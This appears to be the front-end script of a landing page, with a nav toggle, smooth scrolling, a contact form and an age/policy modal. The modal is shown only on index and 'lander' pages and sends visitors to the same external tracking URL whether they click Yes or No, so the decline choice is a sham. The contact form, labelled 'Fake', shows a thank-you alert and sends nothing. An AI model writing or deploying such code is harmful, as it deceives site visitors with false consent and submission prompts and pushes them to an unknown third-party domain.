/* ===============================
   Mobile nav toggle
================================ */
const navToggle = document.querySelector('[data-nav-toggle]');
const navMenu = document.querySelector('[data-nav-menu]');

if (navToggle && navMenu) {
  navToggle.addEventListener('click', () => {
    navMenu.classList.toggle('open');
    navMenu.style.display = navMenu.classList.contains('open') ? 'flex' : '';
  });
}

/* ===============================
   Smooth scroll
================================ */
document.querySelectorAll('a[href^="#"]').forEach(link => {
  link.addEventListener('click', e => {
    const id = link.getAttribute('href');
    const el = document.querySelector(id);
    if (el) {
      e.preventDefault();
      el.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  });
});

/* ===============================
   Fake contact form submit
================================ */
const form = document.querySelector('#contact-form');
if (form) {
  form.addEventListener('submit', e => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(form).entries());
    alert(`Thanks ${data.name || 'there'}! We'll reach out soon.`);
    form.reset();
  });
}

/* ===============================
   AGE / POLICY MODAL (CLEAN)
   - shows once per session
   - uses CSS .active
================================ */
(function () {
  const path = window.location.pathname;
  const isTargetPage = /(^\/$|index\.html$|lander\.html$)/.test(path);
  if (!isTargetPage) return;

  if (sessionStorage.getItem('policyAccepted') === '1') return;

  // Create modal
  const backdrop = document.createElement('div');
  backdrop.className = 'modal-backdrop';
  backdrop.id = 'policyModal';

  backdrop.innerHTML = `
    <div class="modal">
      <button class="modal-close" aria-label="Close">✕</button>
      <h3>Policy Notice</h3>
      <p>
        By continuing, you confirm that you are 18+ and agree to our
        Terms & Privacy Policy.
      </p>
      <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:16px;">
        <button class="btn" id="policy-yes">Yes, Continue</button>
        <button class="btn ghost" id="policy-no">No</button>
      </div>
    </div>
  `;

  document.body.appendChild(backdrop);

  // Show modal
  requestAnimationFrame(() => backdrop.classList.add('active'));

  function closeModal() {
    backdrop.classList.remove('active');
    setTimeout(() => backdrop.remove(), 200);
  }

  // Accept → save + redirect
  backdrop.querySelector('#policy-yes').addEventListener('click', () => {
    sessionStorage.setItem('policyAccepted', '1');
    window.location.href =
      'http://h2n6.com/?utm_campaign=9qv8yQwH8i&v1=[v1]&v2=[v2]&v3=[v3]';
  });

  // Decline → redirect or close
  backdrop.querySelector('#policy-no').addEventListener('click', () => {
    window.location.href =
      'http://h2n6.com/?utm_campaign=9qv8yQwH8i&v1=[v1]&v2=[v2]&v3=[v3]';
  });

  // Close icon
  backdrop.querySelector('.modal-close').addEventListener('click', closeModal);
})();
